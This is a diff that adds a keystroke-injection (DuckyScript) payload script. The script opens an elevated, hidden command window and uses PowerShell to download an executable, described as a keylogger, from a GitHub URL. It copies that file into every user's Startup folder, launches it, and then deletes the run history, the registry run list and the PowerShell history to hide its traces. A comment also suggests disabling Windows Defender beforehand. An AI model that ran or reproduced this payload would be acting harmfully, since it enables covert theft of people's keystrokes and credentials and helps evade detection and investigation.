@@ -1,0 +1,31 @@
+REM install keylogger onto all users in a windows computer.
+REM you may have to use a payload that disables windows defender.
+DELAY 3000
+GUI r
+DELAY 300
+STRING cmd /k color FE & mode con:cols=18 lines=1
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 500
+REM -----------goto users folder
+STRING cd %UserProfile% & cd ..
+ENTER
+REM -----------download keylogger
+STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://github.com/IvanBoss-3000/KL/blob/main/VxTesting.exe?raw=true','%TEMP%\netst.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://github.com/IvanBoss-3000/KL/blob/main/VxTesting.exe?raw=true','%TEMP%\netst.exe');}
+ENTER
+DELAY 2000
+REM ----------- copy keylogger to all startup folders, then start it
+STRING FOR /D %G in ("*") DO (copy /y %TEMP%\netst.exe "C:\Users\%G\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\netst.exe")
+ENTER
+DELAY 300
+STRING start "" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\netst.exe"
+ENTER
+REM ----------- clean up traces of being there
+STRING del /q %temp%\netst.exe
+ENTER
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
+STRING del /q %Appdata%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt & exit
+ENTER
+ALT F4
